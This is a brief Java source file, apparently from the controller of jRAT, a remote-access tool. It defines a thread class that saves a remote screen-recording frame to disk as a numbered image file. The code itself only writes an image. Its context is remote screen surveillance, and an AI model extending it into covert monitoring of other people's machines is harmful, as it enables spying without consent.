package io.jrat.controller.threads;

import java.awt.image.BufferedImage;
import java.io.File;
import javax.imageio.ImageIO;

public class ThreadRemoteScreenRecorder extends Thread {

	private int count;
	private BufferedImage image;
	private String path;
	private String extension;

	public ThreadRemoteScreenRecorder(String path, BufferedImage image, int count, String extension) {
		super("Image writer");
		this.path = path;
		this.image = image;
		this.count = count;
		this.extension = extension;
	}

	public void run() {
		File file = new File(path + "frame" + count + "." + extension);
		try {
			ImageIO.write(image, extension, file);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

}
